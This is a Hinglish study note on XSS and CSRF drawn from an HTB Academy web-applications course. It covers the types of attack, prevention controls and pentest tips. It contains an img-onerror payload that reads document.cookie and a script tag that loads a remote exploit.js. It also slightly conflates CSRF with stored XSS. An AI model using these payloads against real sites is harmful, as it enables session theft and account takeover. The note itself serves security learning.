# Cross-Site Scripting (XSS) & CSRF

## XSS Overview
HTML Injection se related hai, lekin XSS mein **JavaScript code inject** karte hain (sirf HTML nahi). Agar victim ke browser mein code execute ho jaye, toh unka account/session compromise ho sakta hai.

## 3 Types of XSS

| Type | Description |
|---|---|
| Reflected XSS | User input turant page pe display hota hai (search results, error msgs) |
| Stored XSS | User input DB mein store hota hai, phir baad mein display hota hai (comments, posts) |
| DOM XSS | Input directly HTML DOM object mein likha jata hai (e.g. page title, username field) |

## Example Payload (Cookie Theft)

```javascript
#"><img src=/ onerror=alert(document.cookie)>
```

Ye payload:
- Image tag inject karta hai jo intentionally break hoti hai (`src=/`)
- `onerror` event trigger hota hai (image load fail hone pe)
- `alert(document.cookie)` execute hoke victim ka cookie popup mein dikhata hai

**Attacker use case:** Cookie steal karke apne server pe bhejna → victim ke session se authenticate hona.

## CSRF (Cross-Site Request Forgery)

XSS jaisa hi input-sanitization flaw se aata hai, lekin CSRF **victim ke authenticated session ka misuse** karta hai — attacker unki taraf se actions perform karwata hai (bina unhe pata chale).

### Common Attack Pattern
1. Attacker malicious JS payload craft karta hai (e.g. password change request)
2. Victim vulnerable page pe payload dekhta hai (e.g. malicious comment)
3. JS automatically execute hota hai — victim ke logged-in session ka use karke password change ho jata hai
4. Attacker ab victim ka account control kar sakta hai

**Remote script loading example:**
```html
"><script src=//www.example.com/exploit.js></script>
```

`exploit.js` mein actual malicious logic hoti hai (password change API call automate karna).

> **Admin targeting:** CSRF se agar admin ka session hijack ho jaye, toh sensitive backend functions tak access mil sakta hai.

## Prevention

| Control | Description |
|---|---|
| **Sanitization** | Special/non-standard characters remove karo input se pehle display/store karne ke |
| **Validation** | Input expected format match kare (e.g. email format check) |

**Additional defenses:**
- Output bhi sanitize karo (defense-in-depth — agar input filter bypass ho jaye tab bhi safe rahe)
- **WAF** (Web Application Firewall) — helps, lekin bypass ho sakta hai, primary defense nahi honi chahiye
- Modern browsers ka built-in XSS protection
- **Anti-CSRF tokens** — har session/request ke liye unique token
- **SameSite cookie attribute** (`Strict` ya `Lax`) — cross-origin requests mein cookie include hone se rokta hai
- Sensitive actions (password change) se pehle current password re-confirm karwana

> **Key takeaway:** Ye sab defenses **layers** hain, primary safeguard nahi. Application ko secure-by-design banana zaroori hai, sirf security appliances pe depend nahi karna.

## Pentest Relevance
- Reflected XSS test karne ka fastest tareeka — search boxes, error messages mein payload try karo
- Stored XSS zyada dangerous hota hai — ek baar stored ho gaya toh har visitor affect hota hai
- CSRF token missing/predictable hona ek common finding hai bug bounty mein
- `SameSite` cookie attribute missing check karna — quick low-hanging fruit

---
*Source: HTB Academy - Introduction to Web Applications*
